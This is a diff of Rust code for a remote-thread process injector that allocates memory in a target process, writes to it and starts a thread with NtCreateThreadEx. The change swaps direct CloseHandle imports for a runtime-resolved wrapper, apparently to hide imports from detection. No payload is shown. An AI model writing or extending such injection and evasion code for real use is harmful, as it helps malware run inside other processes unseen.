@@ -16,7 +16,6 @@ impl Injector for RemoteThreadInjector {
             ));
         }
 
-        use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
         use winapi::um::processthreadsapi::OpenProcess;
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
@@ -41,7 +40,7 @@ impl Injector for RemoteThreadInjector {
                 PAGE_READWRITE,
             );
             if remote_mem.is_null() {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("RemoteThread: VirtualAllocEx failed"));
             }
 
@@ -54,7 +53,7 @@ impl Injector for RemoteThreadInjector {
                 &mut written,
             ) == 0
             {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("RemoteThread: WriteProcessMemory failed"));
             }
 
@@ -107,16 +106,16 @@ impl Injector for RemoteThreadInjector {
                 std::ptr::null_mut(),
             );
             if status < 0 {
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
                 return Err(anyhow!(
                     "RemoteThread: NtCreateThreadEx failed: {:x}",
                     status
                 ));
             }
             if !h_thread.is_null() {
-                CloseHandle(h_thread);
+                pe_resolve::close_handle(h_thread);
             }
-            CloseHandle(h_proc);
+            pe_resolve::close_handle(h_proc);
         }
         Ok(())
     }
